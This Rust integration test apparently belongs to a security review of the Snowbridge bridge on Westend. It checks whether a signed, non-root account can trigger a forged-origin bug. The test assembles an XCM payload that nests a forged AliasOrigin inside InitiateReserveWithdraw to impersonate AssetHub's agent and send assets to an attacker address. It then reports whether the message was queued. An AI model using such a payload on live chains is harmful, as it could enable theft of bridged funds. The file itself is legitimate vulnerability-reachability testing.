// SPDX-License-Identifier: Apache-2.0
// Follow-up to poc_forged_alias_origin.rs (SNOWBSC-690 review).
//
//! # Reachability check: does a real, signed, non-root extrinsic reach the same bug?
//!
//! poc_forged_alias_origin.rs demonstrates the forged-origin bug by calling
//! `asset_hub_westend_runtime::PolkadotXcm::send_xcm` directly from test code —
//! its own module docs note this "bypasses the send-extrinsic SendXcmOrigin
//! filter". That's a fair thing to flag: it proves the converter/barrier bug
//! exists, but not that an ordinary signed account can trigger it.
//!
//! This file tests the most promising signed-reachable candidate:
//! `InitiateReserveWithdraw`, executed via the real `pallet_xcm::execute`
//! extrinsic under a signed (non-root) origin. `InitiateReserveWithdraw`'s
//! executor handler sends its outgoing message *as the chain itself* (no
//! `DescendOrigin` — confirmed by reading xcm-executor/src/lib.rs:1229-1258),
//! which is exactly the bare-origin property `DenyExportMessageFrom` requires.
//!
//! Before running this, code-reading turned up a likely blocker: the handler
//! unconditionally inserts `ClearOrigin` before appending the caller's custom
//! `xcm` tail (xcm-executor/src/lib.rs:1248), and `UnpaidRemoteExporter::validate`
//! (xcm-builder/src/universal_exports.rs:244-251) wraps that *entire* message
//! verbatim as `ExportMessage`'s `xcm` field. The converter's `extract_remote_fee`
//! requires the very first instruction to be `WithdrawAsset` and the second to
//! be `PayFees` — but the second instruction here would be `ClearOrigin`. If
//! that's right, this specific path fails for a structural reason unrelated to
//! the origin-forging question, regardless of whether the origin would
//! otherwise have passed. The test below settles this empirically rather than
//! leaving it as analysis.

use crate::{imports::*, tests::snowbridge_common::*};
use snowbridge_core::AgentIdOf;
use sp_core::H256;
use xcm_executor::traits::ConvertLocation;

const ATTACKER_ETH: [u8; 20] = hex_literal::hex!("beefcafe00000000000000000000000000000001");
// fund_on_ah() mints INITIAL_FUND (5e13) of the ethereum()-denominated asset into the
// sender; keep well under that so the local withdrawal is genuinely backed.
const ENA_AMOUNT: u128 = 1_000_000_000; // 1e9, well within INITIAL_FUND

fn asset_hub_seen_from_ethereum() -> Location {
	Location::new(
		1,
		[
			GlobalConsensus(ByGenesis(WESTEND_GENESIS_HASH)),
			Parachain(AssetHubWestend::para_id().into()),
		],
	)
}

fn expected_agent_id() -> H256 {
	AgentIdOf::convert_location(&asset_hub_seen_from_ethereum())
		.expect("AssetHub location resolves to an agent id")
}

fn attacker_beneficiary() -> Location {
	Location::new(0, [AccountKey20 { network: None, key: ATTACKER_ETH }])
}

fn inner_eth_fee() -> Asset {
	Asset { id: AssetId(Location::here()), fun: Fungible(REMOTE_FEE_AMOUNT_IN_ETHER) }
}

fn inner_native_eth_transfer() -> Asset {
	Asset { id: AssetId(Location::here()), fun: Fungible(ENA_AMOUNT) }
}

fn bridge_hub_event_evidence() -> (bool, bool, bool, Vec<(H256, Vec<u8>)>) {
	type RuntimeEvent = <BridgeHubWestend as Chain>::RuntimeEvent;
	let events = <BridgeHubWestend as Chain>::events();
	let mut message_queued = false;
	let mut processed_ok = false;
	let mut processed_fail = false;
	let mut messages: Vec<(H256, Vec<u8>)> = Vec::new();
	for event in events.iter() {
		match event {
			RuntimeEvent::EthereumOutboundQueueV2(
				snowbridge_pallet_outbound_queue_v2::Event::MessageQueued { message },
			) => {
				message_queued = true;
				messages.push((
					message.origin,
					message.commands.iter().map(|c| c.index()).collect(),
				));
			},
			RuntimeEvent::MessageQueue(pallet_message_queue::Event::Processed {
				success: true,
				..
			}) => processed_ok = true,
			RuntimeEvent::MessageQueue(pallet_message_queue::Event::Processed {
				success: false,
				..
			}) => processed_fail = true,
			_ => {},
		}
	}
	(message_queued, processed_ok, processed_fail, messages)
}

/// Signed, non-root: a real user's own `execute` extrinsic, containing a raw
/// `InitiateReserveWithdraw` instruction whose custom `xcm` tail carries the
/// same forged `AliasOrigin` as the original PoC's break-path test. No
/// internal-function shortcut, no root origin - exactly what an ordinary
/// attacker-controlled account could dispatch today.
#[test]
fn reach_forged_origin_via_signed_initiate_reserve_withdraw() {
	fund_on_bh();
	fund_on_ah();

	let expected_agent = expected_agent_id();
	let asset_hub_global = asset_hub_seen_from_ethereum();

	let dispatch = AssetHubWestend::execute_with(|| {
		type RuntimeOrigin = <AssetHubWestend as Chain>::RuntimeOrigin;

		let local_fee_asset =
			Asset { id: AssetId(Location::parent()), fun: Fungible(LOCAL_FEE_AMOUNT_IN_DOT) };
		// A real, backed Ethereum-native asset the signed sender genuinely holds
		// (minted by fund_on_ah()), withdrawn locally via the normal asset
		// transactor - no balance forgery here, only the origin is forged.
		let ena_asset = Asset { id: AssetId(ethereum()), fun: Fungible(ENA_AMOUNT) };

		let forged_tail = Xcm(vec![
			WithdrawAsset(inner_eth_fee().into()),
			PayFees { asset: inner_eth_fee() },
			WithdrawAsset(inner_native_eth_transfer().into()),
			AliasOrigin(asset_hub_global.clone()),
			DepositAsset { assets: Wild(AllCounted(1)), beneficiary: attacker_beneficiary() },
			SetTopic([21u8; 32]),
		]);

		let xcm = VersionedXcm::from(Xcm(vec![
			WithdrawAsset(vec![ena_asset.clone(), local_fee_asset.clone()].into()),
			PayFees { asset: local_fee_asset },
			InitiateReserveWithdraw {
				assets: Wild(All),
				reserve: ethereum(),
				xcm: forged_tail,
			},
		]));

		<AssetHubWestend as AssetHubWestendPallet>::PolkadotXcm::execute(
			RuntimeOrigin::signed(AssetHubWestendSender::get()),
			bx!(xcm),
			// InitiateReserveWithdraw weighs its nested xcm tail for this budget, so the
			// simpler baseline's EXECUTION_WEIGHT (8e9) undershoots; first attempt needed
			// ~3.83e10 ref_time / 630981 proof_size - budget generously above that.
			Weight::from_parts(60_000_000_000, 2_000_000),
		)
	});

	assert!(dispatch.is_ok(), "signed execute must dispatch Ok on AssetHub, got {dispatch:?}");

	let (message_queued, _processed_ok, processed_fail, messages) =
		BridgeHubWestend::execute_with(bridge_hub_event_evidence);

	// Report the actual outcome plainly - this is an empirical check, not a
	// predetermined one. Either finding is useful: success would mean a
	// genuinely signed-reachable path to the bug exists beyond the original
	// PoC's internal-function shortcut; the predicted ClearOrigin mismatch
	// would mean this specific instruction doesn't carry the attack, without
	// settling whether some other signed-reachable path might.
	if message_queued {
		let last_origin = messages.last().expect("message present").0;
		assert_eq!(
			last_origin,
			expected_agent,
			"message queued, but origin does not match the forged AssetHub agent id \
			 (queued origin(s): {messages:?})"
		);
		panic!(
			"REACHABLE: a signed, non-root InitiateReserveWithdraw forged the AssetHub \
			 agent origin exactly like the internal-function PoC does. origin={:#?}",
			last_origin
		);
	} else {
		panic!(
			"NOT REACHABLE via this instruction: no message was queued (processed_fail={processed_fail}). \
			 Consistent with the predicted ClearOrigin/converter-syntax mismatch, not with the \
			 alias-origin guard rejecting it for origin-related reasons."
		);
	}
}
